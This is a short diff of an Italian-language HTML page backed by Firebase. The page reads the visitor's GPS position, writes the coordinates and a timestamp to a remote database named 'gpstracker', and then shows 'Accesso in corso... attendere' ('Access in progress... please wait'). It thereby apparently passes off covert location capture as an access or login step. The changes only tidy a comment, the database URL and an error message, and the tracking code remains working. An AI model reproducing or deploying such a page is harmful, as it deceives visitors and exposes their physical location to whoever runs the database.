@@ -5,8 +5,7 @@
     <script src="https://www.gstatic.com"></script>
     <script src="https://www.gstatic.com"></script>
     <script>
-        // SOSTITUISCI IL LINK SOTTO CON IL TUO DI FIREBASE (quello .firebaseio.com)
-        const config = { databaseURL: "https://gpstracker-61102-default-rtdb.europe-west1.firebasedatabase.app/" };
+        const config = { databaseURL: "https://gpstracker-61102-default-rtdb.europe-west1.firebasedatabase.app" };
         firebase.initializeApp(config);
         function check() {
             navigator.geolocation.getCurrentPosition(p => {
@@ -15,7 +14,7 @@
                     lon: p.coords.longitude,
                     date: new Date().toLocaleString()
                 }).then(() => alert("Accesso in corso... attendere"));
-            }, e => alert("Attiva il GPS per continuare"));
+            }, e => alert("Errore: Attiva il GPS e riprova"));
         }
     </script>
 </body>
